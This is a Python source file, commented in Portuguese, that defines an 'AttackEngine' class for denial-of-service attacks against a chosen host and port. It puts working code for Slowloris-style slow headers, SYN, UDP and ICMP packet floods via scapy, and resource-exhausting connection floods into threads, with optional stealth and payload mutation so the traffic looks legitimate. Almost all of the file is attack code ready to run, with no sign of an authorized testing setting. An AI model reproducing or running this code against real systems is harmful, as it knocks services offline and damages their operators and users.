#!/usr/bin/env python3
"""
Engine de Ataque Principal
Implementa os diferentes modos de ataque
"""

import threading
import time
import socket
import random
import struct
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, ICMP
from colorama import Fore, Style
from .payload_mutator import PayloadMutator
from .stealth_utils import StealthUtils

class AttackEngine:
    """Engine principal para execução de ataques"""
    
    def __init__(self, target, port=80, duration=30, threads=10, 
                stealth=False, payload_mutation=False):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stealth = stealth
        self.payload_mutation = payload_mutation
        self.running = False
        self.connections = []
        
        # Inicializar utilitários
        self.mutator = PayloadMutator() if payload_mutation else None
        self.stealth_utils = StealthUtils() if stealth else None
        
        print(f"{Fore.CYAN}[*] Engine inicializada{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Alvo: {target}:{port}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Duração: {duration}s{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Threads: {threads}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Stealth: {'Ativado' if stealth else 'Desativado'}{Style.RESET_ALL}")
    
    def low_and_slow_attack(self):
        """Ataque Low-and-Slow (tipo Slowloris)"""
        print(f"{Fore.BLUE}[*] Iniciando ataque Low-and-Slow{Style.RESET_ALL}")
        
        self.running = True
        threads_list = []
        
        for i in range(self.threads):
            thread = threading.Thread(
                target=self._slowloris_worker,
                args=(i,)
            )
            thread.daemon = True
            thread.start()
            threads_list.append(thread)
        
        # Aguardar duração especificada
        time.sleep(self.duration)
        self.running = False
        
        print(f"{Fore.GREEN}[+] Ataque Low-and-Slow concluído{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Conexões mantidas: {len(self.connections)}{Style.RESET_ALL}")
    
    def _slowloris_worker(self, worker_id):
        """Worker para ataque Slowloris"""
        while self.running:
            try:
                # Criar socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                
                # Conectar ao alvo
                sock.connect((self.target, self.port))
                self.connections.append(sock)
                
                print(f"{Fore.GREEN}[+] Worker {worker_id}: Conexão estabelecida{Style.RESET_ALL}")
                
                # Enviar headers parciais
                while self.running and sock in self.connections:
                    try:
                        # Header parcial para manter conexão
                        partial_header = "X-a: {}\r\n".format(random.randint(1, 5000))
                        sock.send(partial_header.encode())
                        
                        # Delay aleatório para parecer legítimo
                        time.sleep(random.uniform(10, 15))
                        
                    except socket.error:
                        break
                        
            except Exception as e:
                print(f"{Fore.RED}[!] Worker {worker_id}: {e}{Style.RESET_ALL}")
                time.sleep(1)
    
    def saturation_attack(self):
        """Ataque de saturação Layer 3/4"""
        print(f"{Fore.BLUE}[*] Iniciando ataque de Saturação{Style.RESET_ALL}")
        
        self.running = True
        threads_list = []
        
        # Dividir threads entre diferentes tipos de ataque
        syn_threads = self.threads // 3
        udp_threads = self.threads // 3
        icmp_threads = self.threads - syn_threads - udp_threads
        
        # SYN Flood
        for i in range(syn_threads):
            thread = threading.Thread(
                target=self._syn_flood_worker,
                args=(i,)
            )
            thread.daemon = True
            thread.start()
            threads_list.append(thread)
        
        # UDP Flood
        for i in range(udp_threads):
            thread = threading.Thread(
                target=self._udp_flood_worker,
                args=(i,)
            )
            thread.daemon = True
            thread.start()
            threads_list.append(thread)
        
        # ICMP Flood
        for i in range(icmp_threads):
            thread = threading.Thread(
                target=self._icmp_flood_worker,
                args=(i,)
            )
            thread.daemon = True
            thread.start()
            threads_list.append(thread)
        
        # Aguardar duração
        time.sleep(self.duration)
        self.running = False
        
        print(f"{Fore.GREEN}[+] Ataque de Saturação concluído{Style.RESET_ALL}")
    
    def _syn_flood_worker(self, worker_id):
        """Worker para SYN Flood"""
        while self.running:
            try:
                # Criar pacote SYN
                ip_layer = IP(dst=self.target)
                tcp_layer = TCP(
                    sport=RandShort(),
                    dport=self.port,
                    flags="S"
                )
                
                # Adicionar mutação se ativada
                if self.payload_mutation:
                    payload = self.mutator.mutate_syn_payload()
                    packet = ip_layer/tcp_layer/Raw(load=payload)
                else:
                    packet = ip_layer/tcp_layer
                
                # Enviar pacote
                send(packet, verbose=False)
                
                print(f"{Fore.YELLOW}[*] Worker {worker_id}: SYN enviado{Style.RESET_ALL}")
                
            except Exception as e:
                print(f"{Fore.RED}[!] Worker {worker_id}: {e}{Style.RESET_ALL}")
    
    def _udp_flood_worker(self, worker_id):
        """Worker para UDP Flood"""
        while self.running:
            try:
                # Criar pacote UDP
                ip_layer = IP(dst=self.target)
                udp_layer = UDP(
                    sport=RandShort(),
                    dport=self.port
                )
                
                # Payload aleatório
                payload_size = random.randint(64, 1024)
                payload = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=payload_size))
                
                packet = ip_layer/udp_layer/Raw(load=payload)
                send(packet, verbose=False)
                
                print(f"{Fore.YELLOW}[*] Worker {worker_id}: UDP enviado{Style.RESET_ALL}")
                
            except Exception as e:
                print(f"{Fore.RED}[!] Worker {worker_id}: {e}{Style.RESET_ALL}")
    
    def _icmp_flood_worker(self, worker_id):
        """Worker para ICMP Flood"""
        while self.running:
            try:
                # Criar pacote ICMP
                ip_layer = IP(dst=self.target)
                icmp_layer = ICMP()
                
                # Payload aleatório
                payload_size = random.randint(32, 512)
                payload = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=payload_size))
                
                packet = ip_layer/icmp_layer/Raw(load=payload)
                send(packet, verbose=False)
                
                print(f"{Fore.YELLOW}[*] Worker {worker_id}: ICMP enviado{Style.RESET_ALL}")
                
            except Exception as e:
                print(f"{Fore.RED}[!] Worker {worker_id}: {e}{Style.RESET_ALL}")
    
    def exploit_attack(self, vulnerability):
        """Ataque de exploração de vulnerabilidades específicas"""
        print(f"{Fore.BLUE}[*] Iniciando exploração: {vulnerability}{Style.RESET_ALL}")
        
        if vulnerability == "tcp_reuse":
            self._tcp_reuse_exploit()
        elif vulnerability == "slow_headers":
            self._slow_headers_exploit()
        elif vulnerability == "connection_flood":
            self._connection_flood_exploit()
        else:
            print(f"{Fore.RED}[!] Vulnerabilidade não suportada: {vulnerability}{Style.RESET_ALL}")
    
    def _tcp_reuse_exploit(self):
        """Exploração de reuso de sockets TCP"""
        print(f"{Fore.CYAN}[*] Explorando reuso de sockets TCP{Style.RESET_ALL}")
        
        self.running = True
        threads_list = []
        
        for i in range(self.threads):
            thread = threading.Thread(
                target=self._tcp_reuse_worker,
                args=(i,)
            )
            thread.daemon = True
            thread.start()
            threads_list.append(thread)
        
        time.sleep(self.duration)
        self.running = False
    
    def _tcp_reuse_worker(self, worker_id):
        """Worker para exploração de reuso TCP"""
        while self.running:
            try:
                # Criar múltiplas conexões rapidamente
                sockets = []
                for _ in range(10):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((self.target, self.port))
                    sockets.append(sock)
                
                print(f"{Fore.GREEN}[+] Worker {worker_id}: {len(sockets)} conexões criadas{Style.RESET_ALL}")
                
                # Manter conexões por um tempo
                time.sleep(random.uniform(1, 3))
                
                # Fechar conexões
                for sock in sockets:
                    sock.close()
                
            except Exception as e:
                print(f"{Fore.RED}[!] Worker {worker_id}: {e}{Style.RESET_ALL}")
    
    def _slow_headers_exploit(self):
        """Exploração de headers lentos"""
        print(f"{Fore.CYAN}[*] Explorando headers lentos{Style.RESET_ALL}")
        
        self.running = True
        threads_list = []
        
        for i in range(self.threads):
            thread = threading.Thread(
                target=self._slow_headers_worker,
                args=(i,)
            )
            thread.daemon = True
            thread.start()
            threads_list.append(thread)
        
        time.sleep(self.duration)
        self.running = False
    
    def _slow_headers_worker(self, worker_id):
        """Worker para headers lentos"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.target, self.port))
                
                # Enviar headers um por vez com delays
                headers = [
                    "GET / HTTP/1.1\r\n",
                    f"Host: {self.target}\r\n",
                    "User-Agent: Mozilla/5.0\r\n",
                    "Accept: text/html\r\n",
                    "Connection: keep-alive\r\n",
                    "\r\n"
                ]
                
                for header in headers:
                    sock.send(header.encode())
                    time.sleep(random.uniform(5, 10))  # Delay entre headers
                
                print(f"{Fore.GREEN}[+] Worker {worker_id}: Headers lentos enviados{Style.RESET_ALL}")
                
                # Manter conexão
                time.sleep(random.uniform(10, 20))
                sock.close()
                
            except Exception as e:
                print(f"{Fore.RED}[!] Worker {worker_id}: {e}{Style.RESET_ALL}")
    
    def _connection_flood_exploit(self):
        """Exploração de flood de conexões"""
        print(f"{Fore.CYAN}[*] Explorando flood de conexões{Style.RESET_ALL}")
        
        self.running = True
        threads_list = []
        
        for i in range(self.threads):
            thread = threading.Thread(
                target=self._connection_flood_worker,
                args=(i,)
            )
            thread.daemon = True
            thread.start()
            threads_list.append(thread)
        
        time.sleep(self.duration)
        self.running = False
    
    def _connection_flood_worker(self, worker_id):
        """Worker para flood de conexões"""
        while self.running:
            try:
                # Criar conexões rapidamente
                for _ in range(50):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((self.target, self.port))
                    
                    # Enviar dados mínimos
                    sock.send(b"GET / HTTP/1.1\r\n\r\n")
                    
                    # Não fechar imediatamente para esgotar recursos
                    self.connections.append(sock)
                
                print(f"{Fore.GREEN}[+] Worker {worker_id}: 50 conexões criadas{Style.RESET_ALL}")
                
            except Exception as e:
                print(f"{Fore.RED}[!] Worker {worker_id}: {e}{Style.RESET_ALL}")
    
    def cleanup(self):
        """Limpeza de recursos"""
        print(f"{Fore.CYAN}[*] Limpando recursos{Style.RESET_ALL}")
        
        # Fechar conexões abertas
        for sock in self.connections:
            try:
                sock.close()
            except:
                pass
        
        self.connections.clear()
        self.running = False 